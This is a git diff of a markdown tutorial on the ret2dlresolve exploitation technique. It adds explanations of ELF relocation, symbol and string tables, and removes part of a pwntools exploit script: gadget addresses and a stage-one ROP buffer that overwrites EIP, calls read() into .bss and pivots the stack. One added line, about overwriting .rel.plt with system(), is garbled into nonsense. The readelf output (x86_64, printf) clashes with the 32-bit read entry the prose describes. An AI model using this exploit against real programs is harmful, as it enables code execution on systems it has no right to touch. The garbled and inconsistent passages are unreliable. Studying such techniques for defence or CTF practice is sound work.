@@ -13,8 +13,12 @@ It allow attackers to resolve and call functions from shared libraries even in t
 	- [Compile a Program with libraries](#compile-a-program-with-libraries)
 		- [Statically link](#static-libraries)
 		- [Dynamically link](#dynamic-linking)
-      - [Plt and Got](#plt-and-got-sections)
+          - [Plt and Got](#plt-and-got-sections)
   - [How the exploit Work](#how-the-exploit-work)
+    - [JMPREL (.rel.plt)](#jmprel-relplt)
+    - [DynSym](#dynsym)
+    - [DynStr](#dynstr)
+    - [_dl_runtime_resolve function](#_dl_runtime_resolve-function)
 - [Exploit](#exploit)
   - [32 bit](#32-bit)
     - [no RELRO](#no-relro)
@@ -231,11 +235,25 @@ Elf file uses to relocation dynamically linked functions. It is the core of ret2
 
 Definition:
 
-- .dynsym: (dynamic symbol) it occur at build time, when librairie symbol are load into our executable.
-- .dynstr: (dynamic string) store string associated with .dynsym for example their name.
-- .rel.plt (relocation.plt) store information of none resolute symb.
+#### JMPREL (.rel.plt)
 
-For example in our main.c
+Stores a tables called Relocation table. Each entry maps to a symbol.
+
+```c
+typedef uint32_t Elf32_Addr; 
+typedef uint32_t Elf32_Word; 
+typedef struct{
+   Elf32_Addr r_offset ; /* Address */ 
+   Elf32_Word r_info ; /* Relocation type and symbol index */ 
+} Elf32_Rel;
+ 
+#define ELF32_R_SYM(val) ((val) >> 8) 
+#define ELF32_R_TYPE(val) ((val) & 0xff)
+```
+
+The type of these entries is Elf32_Rel, which is defined as it follows. The size of one entry is 8 bytes.
+
+The ELF32_R_SYM(r_info) == 1 variable gives the index of the Elf32_Sym in SYMTAB for the specified symbol
 
 ```bash
 $> readelf -r a.out
@@ -244,13 +262,56 @@ Relocation section '.rela.plt' at offset 0x548 contains 1 entrie:
 000000404018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
 ```
 
+Let’s take a look at our table:
+
+  - The column Name gives the name of our symbol: read@GLIBC_2.0;
+  - Offset is the address of the GOT entry for the symbol: 0x0804a00c;
+  - Info stores additional metadata such as ELF32_R_SYM or ELF32_R_TYPE;
+
+According to the defined MACROS, `ELF32_R_SYM(r_info) == 1` and `ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)`. 
+
 :warning: When the dynamic linker resolve the functon's address it overwrite the GOT entry and the .rel.plt.
+
+#### DynSym
+
+This table holds relevant symbol information. Each entry is a Elf32_Sym structure and its size is 16 bytes.
+
+```c
+typedef struct { 
+   Elf32_Word st_name ; /* Symbol name (string tbl offset) -4b*/
+   Elf32_Addr st_value ; /* Symbol value -4b*/ 
+   Elf32_Word st_size ; /* Symbol size -4b*/ 
+   unsigned char st_info ; /* Symbol type and binding-1b */ 
+   unsigned char st_other ; /* Symbol visibility under glibc>=2.2 -1b */ 
+   Elf32_Section st_shndx ; /* Section index -2b*/ 
+} Elf32_Sym;
+```
+
+#### DynStr
+
+.dynstr: (dynamic string) store string associated with .dynsym.
+
+```bash
+0x804822C ; ELF String Table
+0x804822C byte_804822C    db 0
+0x804822D aLibcSo6        db 'libc.so.6',0
+0x8048237 aIoStdinUsed    db '_IO_stdin_used',0
+0x8048246 aRead           db 'read',0
+0x804824B aAlarm          db 'alarm',0
+0x8048251 aLibcStartMain  db '__libc_start_main',0
+0x8048263 aGmonStart      db '__gmon_start__',0
+0x8048272 aGlibc20        db 'GLIBC_2.0',0
+```
+
+#### _dl_runtime_resolve Function
+
+//incoming
 
 **3** ways:
 
 #### Direct control over the content of the .rel.plt items
 
-- overwrite the .rel.plt with the address of system(), when the dl is call, he know the resolution as been done and can call it.
+- overwrite the .rel.lf32_sym to STRTAB gives the addreplt with the address of system(), when the dl is call, he know the resolution as been done and can call it.
 
 #### Indirecty control the content of the .rel.plt items
 
@@ -285,70 +346,8 @@ int main(void)
 
 Follow the [payload](/pwn/payload/payload_ret2dlresolve_32bit_partialRELRO.py).
 
-- First it get every addresses sections:
+//incoming
 
-```py
-# code
-addr_dynsym     = elf.get_section_by_name('.dynsym').header['sh_addr']
-addr_dynstr     = elf.get_section_by_name('.dynstr').header['sh_addr']
-addr_relplt     = elf.get_section_by_name('.rel.plt').header['sh_addr']
-addr_plt        = elf.get_section_by_name('.plt').header['sh_addr']
-addr_bss        = elf.get_section_by_name('.bss').header['sh_addr']
-addr_plt_read   = elf.plt['read']
-addr_got_read   = elf.got['read']
-```
-
-*You can print every section of your programm on gdb-gef with `info file`*
-
-```py
-#output
-[*] Section Headers
-[*] .dynsym  : 0x80481cc
-[*] .dynstr  : 0x804821c
-[*] .rel.plt : 0x8048298
-[*] .plt     : 0x80482d0
-[*] .bss     : 0x804a020
-[*] read@plt : 0x80482e0
-[*] read@got : 0x804a00c
-```
-
-- Load [some gadget](/tools/RopGadget.md) (addapt it to your code)
-
-```py
-# Gadget
-addr_pop3 = 0x080484b9 # pop esi, pop edi, pop ebp, ret
-addr_pop_ebp = 0x080484bb # pop ebp, ret
-addr_leave_ret = 0x08048398 # leave, ret
-```
-
-- control eip to call a `read(0, addr_bss+0x300, 100);` and write our fake struct inside the bss section.
-
-Why in bss ? bss is a section where data unitialized are stored. There is a anmout of place fill with zero in a read-write section. What is better ? 
-
-```py
-stack_size = 0x300
-base_stage = addr_bss + stack_size
- 
-#read(0,base_stage,100)
-#jmp base_stage
-buf1 = b'A'* (28) #offset
-buf1 += p32(addr_plt_read)  #eip overwrite with read@plt (read())
-buf1 += p32(addr_pop3)      # pop 3 times and ret
-buf1 += p32(0)              # read arg
-buf1 += p32(base_stage)     # //
-buf1 += p32(100)            # //
-buf1 += p32(addr_pop_ebp)   # pop ebp and ret
-buf1 += p32(base_stage)     # 
-buf1 += p32(addr_leave_ret) #
-```
-
-Is stack size use as a padding ? maybe ? 
-
-What happened:
-
-- program leave to read@plt wich call read because ld has been allready call
-- it read the second buffer (we gonna see it later)
-- then 
 
 ### Documentation
 
